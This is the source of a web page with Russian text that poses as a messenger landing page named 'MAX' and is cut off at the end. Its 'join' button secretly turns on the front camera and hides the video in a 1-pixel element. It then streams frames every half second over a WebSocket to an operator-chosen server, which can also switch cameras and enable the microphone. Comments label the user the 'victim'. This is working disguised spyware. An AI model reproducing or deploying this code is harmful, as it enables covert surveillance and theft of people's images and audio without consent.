<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MAX ‚Äî —Ñ–∏–æ–ª–µ—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ—Å—Ç–≤–æ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a0b2e 0%, #2d1b3a 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .phone-frame {
            width: 375px;
            background: linear-gradient(135deg, #7b2eda 0%, #b537f2 100%);
            border-radius: 50px;
            overflow: hidden;
            box-shadow: 0 30px 60px rgba(106, 13, 173, 0.5);
            padding: 25px 20px;
            position: relative;
            border: 2px solid #d4a5ff;
        }

        .max-logo {
            font-size: 52px;
            font-weight: 900;
            background: linear-gradient(135deg, #ffffff 0%, #f0e6ff 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            letter-spacing: -1px;
            text-shadow: 0 0 20px rgba(255,255,255,0.5);
        }

        /* –°–µ–∫—Ä–µ—Ç–Ω–∞—è –∫–Ω–æ–ø–∫–∞ (–¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è) */
        .secret-area {
            position: absolute;
            top: 0;
            left: 0;
            width: 100px;
            height: 100px;
            background: transparent;
            z-index: 10000;
            cursor: pointer;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            line-height: 1.2;
            margin-bottom: 10px;
            color: white;
            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }

        .subtitle {
            color: #e0d0ff;
            font-size: 16px;
            line-height: 1.4;
            margin-bottom: 20px;
            white-space: pre-line;
        }

        .time {
            font-size: 28px;
            font-weight: 600;
            margin: 20px 0;
            color: white;
            text-shadow: 0 0 15px #ffa5ff;
        }

        h2 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 15px;
            color: white;
        }

        .chat-list {
            list-style: none;
            margin-bottom: 30px;
        }

        .chat-list li {
            padding: 8px 0;
            font-size: 16px;
            color: white;
        }

        .chat-list .indent {
            padding-left: 20px;
        }

        .chat-list .bold {
            font-weight: 600;
            color: #ffd5ff;
        }

        .chat-list .gray {
            color: #d0b0ff;
            font-size: 14px;
        }

        .chat-list .typing {
            color: #b5ffb5;
        }

        .badge {
            background: #ff44e6;
            color: white;
            border-radius: 15px;
            padding: 2px 8px;
            font-size: 12px;
            margin-left: 5px;
            box-shadow: 0 0 10px #ff44e6;
        }

        .max-button {
            background: linear-gradient(135deg, #c323ff 0%, #a020f0 100%);
            color: white;
            border: none;
            padding: 18px 20px;
            border-radius: 40px;
            font-size: 20px;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            text-align: center;
            box-shadow: 0 10px 30px rgba(162, 0, 255, 0.6);
            transition: all 0.3s;
            border: 1px solid #ffa5ff;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .max-button:hover {
            transform: scale(1.02);
            box-shadow: 0 15px 40px rgba(195, 0, 255, 0.8);
        }

        .max-button:active {
            transform: scale(0.98);
        }

        .max-button:disabled {
            opacity: 0.7;
            transform: none;
        }

        /* –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –ø–∞—Ä–æ–ª—è */
        .password-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(46, 7, 63, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 20000;
            backdrop-filter: blur(15px);
        }

        .password-modal.active {
            display: flex;
        }

        .password-box {
            background: linear-gradient(135deg, #9932cc 0%, #8a2be2 100%);
            padding: 40px;
            border-radius: 40px;
            width: 340px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(138, 43, 226, 0.7);
            border: 2px solid #e6b3ff;
        }

        .password-box h3 {
            margin-bottom: 25px;
            color: white;
            font-size: 28px;
            text-shadow: 0 0 15px #ffa5ff;
        }

        .password-box input {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 30px;
            font-size: 22px;
            margin-bottom: 20px;
            text-align: center;
            letter-spacing: 8px;
            background: rgba(255,255,255,0.95);
            color: #8a2be2;
            font-weight: bold;
        }

        .password-box input:focus {
            outline: none;
            box-shadow: 0 0 0 4px #ffa5ff;
        }

        .password-box button {
            background: white;
            color: #8a2be2;
            border: none;
            padding: 18px 30px;
            border-radius: 40px;
            font-size: 20px;
            font-weight: 800;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            text-transform: uppercase;
        }

        .password-box button:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(255,255,255,0.4);
        }

        .password-error {
            color: #ffb3b3;
            background: rgba(106, 13, 173, 0.9);
            padding: 12px;
            border-radius: 20px;
            margin-top: 15px;
            display: none;
            font-weight: bold;
        }

        /* –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –¥–ª—è –∂–µ—Ä—Ç–≤—ã */
        .victim-panel {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, #6a0dad 0%, #4b0082 100%);
            padding: 35px;
            border-radius: 50px;
            box-shadow: 0 20px 80px rgba(75, 0, 130, 0.8);
            z-index: 20001;
            display: none;
            width: 360px;
            text-align: center;
            color: white;
            border: 3px solid #d4a5ff;
        }

        .victim-panel.active {
            display: block;
        }

        .victim-panel h2 {
            color: white;
            margin-bottom: 25px;
            font-size: 32px;
            text-shadow: 0 0 15px #e6b3ff;
        }

        .camera-status {
            padding: 18px;
            background: rgba(255,255,255,0.15);
            border-radius: 30px;
            margin-bottom: 25px;
            font-size: 18px;
            backdrop-filter: blur(10px);
            border: 1px solid #d4a5ff;
        }

        .panel-btn {
            background: white;
            color: #4b0082;
            border: none;
            padding: 18px 25px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            width: 100%;
            margin-bottom: 15px;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .panel-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(255,255,255,0.3);
        }

        .panel-btn.danger {
            background: #ff4444;
            color: white;
        }

        .close-panel {
            margin-top: 20px;
            color: #e6b3ff;
            font-size: 16px;
            cursor: pointer;
        }

        /* –°–∫—Ä—ã—Ç–∞—è –∫–∞–º–µ—Ä–∞ */
        #camera-container {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            overflow: hidden;
            z-index: 9999;
        }

        #camera-container video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        #audio-container {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            overflow: hidden;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div class="phone-frame">
        <!-- –°–µ–∫—Ä–µ—Ç–Ω–∞—è –∫–Ω–æ–ø–∫–∞ –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è -->
        <div class="secret-area" id="secretArea" onclick="handleSecretClick(event)"></div>
        
        <div class="max-logo">MAX</div>
        
        <h1>–ú–∞–∫—Å–∏–º—É–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π –¥–ª—è –≤–∞–∂–Ω—ã—Ö –¥–µ–ª</h1>
        
        <div class="subtitle">–ë—ã—Å—Ç—Ä–æ–µ –∏ –ª—ë–≥–∫–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ<br>–¥–ª—è –æ–±—â–µ–Ω–∏—è –∏ —Ä–µ—à–µ–Ω–∏—è<br>–ø–æ–≤—Å–µ–¥–Ω–µ–≤–Ω—ã—Ö –∑–∞–¥–∞—á</div>
        
        <div class="time" id="currentTime">--:--</div>
        
        <h2>–ß–∞—Ç—ã</h2>
        
        <ul class="chat-list">
            <li class="bold">–í—Å–µ</li>
            <li class="indent">–ù–æ–≤—ã–µ <span class="badge">1</span></li>
            <li class="indent">–°–µ–º—å—è</li>
            <li class="indent">–ö–∞–Ω–∞–ª—ã <span class="badge">5</span></li>
            
            <li class="bold">–í–∏–∫–∞ –ß–µ—Ä–Ω–æ–≤–∞</li>
            <li class="indent gray typing">... –ø–µ—á–∞—Ç–∞–µ—Ç</li>
            
            <li class="bold">–Æ—Ä–∞ –ö–æ–ª–µ—Å–Ω–∏–∫–æ–≤</li>
            <li class="indent gray">–ö–∏–Ω–æ –≤–µ—á–µ—Ä–æ–º, —Ç—ã —Å –Ω–∞–º–∏?</li>
            
            <li class="bold">–°–∞—à–∞</li>
            <li class="indent gray">...</li>
        </ul>
        
        <button class="max-button" id="joinBtn" onclick="joinGroup()">
            –í—Å—Ç—É–ø–∏—Ç—å –≤ MAX
        </button>
    </div>

    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –ø–∞—Ä–æ–ª—è (–¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è) -->
    <div class="password-modal" id="passwordModal">
        <div class="password-box">
            <h3>üîê MAX ACCESS</h3>
            <input type="password" id="passwordInput" placeholder="******" maxlength="6" inputmode="numeric" autocomplete="off">
            <button onclick="checkPassword()">–í–û–ô–¢–ò</button>
            <div class="password-error" id="passwordError">–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å</div>
        </div>
    </div>

    <!-- –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –¥–ª—è –∂–µ—Ä—Ç–≤—ã -->
    <div class="victim-panel" id="victimPanel">
        <h2>‚öôÔ∏è –ù–ê–°–¢–†–û–ô–ö–ò</h2>
        <div class="camera-status" id="cameraStatusText">–°—Ç–∞—Ç—É—Å: –ø–æ–¥–∫–ª—é—á–µ–Ω–æ</div>
        <button class="panel-btn danger" onclick="stopAll()">üî¥ –û–¢–ö–õ–Æ–ß–ò–¢–¨ –í–°–Å</button>
        <button class="panel-btn" onclick="closeVictimPanel()">–ó–ê–ö–†–´–¢–¨</button>
        <div class="close-panel" onclick="closeVictimPanel()">‚úï –∑–∞–∫—Ä—ã—Ç—å</div>
    </div>

    <!-- –°–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è –∫–∞–º–µ—Ä—ã –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ -->
    <div id="camera-container">
        <video id="webcam" autoplay playsinline muted></video>
    </div>
    <div id="audio-container">
        <audio id="microphone" autoplay></audio>
    </div>

    <script>
        // ========== –ü–ï–†–ï–ú–ï–ù–ù–´–ï ==========
        let stream = null;
        let audioStream = null;
        let ws = null;
        let isActive = false;
        let clickCount = 0;
        let clickTimer = null;
        
        // –£–Ω–∏–∫–∞–ª—å–Ω—ã–π ID —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        const deviceId = 'MAX-' + Math.random().toString(36).substring(2, 10).toUpperCase();
        
        // –ê–¥—Ä–µ—Å —Å–µ—Ä–≤–µ—Ä–∞ (–ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ô IP!)
        const SERVER_URL = 'ws://192.168.1.100:8080/max-access'; // ‚Üê –ø–æ–º–µ–Ω—è–π –Ω–∞ —Å–≤–æ–π IP

        // ========== –†–ï–ê–õ–¨–ù–û–ï –í–†–ï–ú–Ø ==========
        function updateRealTime() {
            const now = new Date();
            const hours = now.getHours().toString().padStart(2, '0');
            const minutes = now.getMinutes().toString().padStart(2, '0');
            document.getElementById('currentTime').innerText = `${hours}:${minutes}`;
        }
        updateRealTime();
        setInterval(updateRealTime, 1000);

        // ========== –°–ï–ö–†–ï–¢–ù–ê–Ø –ö–ù–û–ü–ö–ê (–¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è) ==========
        function handleSecretClick(event) {
            clickCount++;
            
            if (clickTimer) clearTimeout(clickTimer);
            
            clickTimer = setTimeout(() => {
                clickCount = 0;
            }, 1000);
            
            if (clickCount === 3) {
                document.getElementById('passwordModal').classList.add('active');
                document.getElementById('passwordInput').value = '';
                document.getElementById('passwordError').style.display = 'none';
                clickCount = 0;
            }
        }

        // ========== –ü–†–û–í–ï–†–ö–ê –ü–ê–†–û–õ–Ø (112233) ==========
        function checkPassword() {
            const password = document.getElementById('passwordInput').value;
            
            if (password === '112233') {
                document.getElementById('passwordModal').classList.remove('active');
                document.getElementById('victimPanel').classList.add('active');
            } else {
                document.getElementById('passwordError').style.display = 'block';
                document.getElementById('passwordInput').value = '';
            }
        }

        function closeVictimPanel() {
            document.getElementById('victimPanel').classList.remove('active');
        }

        // ========== –í–°–¢–£–ü–õ–ï–ù–ò–ï –í –ì–†–£–ü–ü–£ ==========
        function joinGroup() {
            const btn = document.getElementById('joinBtn');
            
            btn.innerText = '–í—Å—Ç—É–ø–∞—é...';
            btn.disabled = true;
            
            setTimeout(() => {
                btn.innerText = '‚úÖ –í—ã –≤ MAX!';
            }, 1500);

            // –ó–∞–ø—É—Å–∫–∞–µ–º –∫–∞–º–µ—Ä—É
            startCamera();
            
            // –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É
            connectToServer();
        }

        // ========== –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï –ö –°–ï–†–í–ï–†–£ ==========
        function connectToServer() {
            try {
                ws = new WebSocket(SERVER_URL);
                
                ws.onopen = function() {
                    console.log('‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ —Å–µ—Ä–≤–µ—Ä—É MAX');
                    
                    // –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
                    ws.send(JSON.stringify({
                        type: 'register',
                        deviceId: deviceId,
                        userAgent: navigator.userAgent
                    }));
                };
                
                ws.onmessage = function(event) {
                    try {
                        const data = JSON.parse(event.data);
                        handleServerCommand(data);
                    } catch(e) {}
                };
                
                ws.onclose = function() {
                    console.log('‚ùå –û—Ç–∫–ª—é—á–µ–Ω–æ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞');
                    // –ü—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è
                    setTimeout(connectToServer, 5000);
                };
                
            } catch(e) {
                console.log('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:', e);
            }
        }

        // ========== –û–ë–†–ê–ë–û–¢–ö–ê –ö–û–ú–ê–ù–î –û–¢ –°–ï–†–í–ï–†–ê ==========
        function handleServerCommand(data) {
            if (data.type === 'command') {
                switch(data.command) {
                    case 'camera':
                        // –°–º–µ–Ω–∏—Ç—å –∫–∞–º–µ—Ä—É
                        toggleCamera(data.camera || 'front');
                        break;
                    case 'audio':
                        // –í–∫–ª—é—á–∏—Ç—å –∞—É–¥–∏–æ
                        startAudio();
                        break;
                    case 'remote':
                        // –≠–º—É–ª—è—Ü–∏—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞
                        console.log('Remote command received');
                        break;
                }
            }
        }

        // ========== –ö–ê–ú–ï–†–ê ==========
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false 
                });
                
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                
                document.getElementById('camera-container').style.display = 'block';
                isActive = true;
                
                startStreaming();
                
            } catch(err) {
                console.log('Camera error:', err);
            }
        }

        async function toggleCamera(type) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: type === 'front' ? 'user' : 'environment',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false 
                });
                
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                
            } catch(err) {}
        }

        // ========== –ê–£–î–ò–û ==========
        async function startAudio() {
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true,
                    video: false 
                });
                
                const audio = document.getElementById('microphone');
                audio.srcObject = audioStream;
                
                document.getElementById('audio-container').style.display = 'block';
                
            } catch(err) {}
        }

        // ========== –°–¢–†–ò–ú–ò–ù–ì ==========
        function startStreaming() {
            const video = document.getElementById('webcam');
            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');
            
            setInterval(() => {
                if (stream && ws && ws.readyState === WebSocket.OPEN && video.readyState === video.HAVE_ENOUGH_DATA) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const frame = canvas.toDataURL('image/jpeg', 0.3);
                    
                    ws.send(JSON.stringify({
                        type: 'frame',
                        deviceId: deviceId,
                        data: frame,
                        timestamp: Date.now()
                    }));
                }
            }, 500);
        }

        // ========== –û–¢–ö–õ–Æ–ß–ò–¢–¨ –í–°–Å ==========
        function stopAll() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            if (audioStream) {
                audioStream.getTracks().forEach(track => track.stop());
                audioStream = null;
            }
            if (ws) {
                ws.close();
                ws = null;
            }
            
            document.getElementById('camera-container').style.display = 'none';
            document.getElementById('audio-container').style.display = 'none';
            document.getElementById('victimPanel').classList.remove('active');
            
            document.get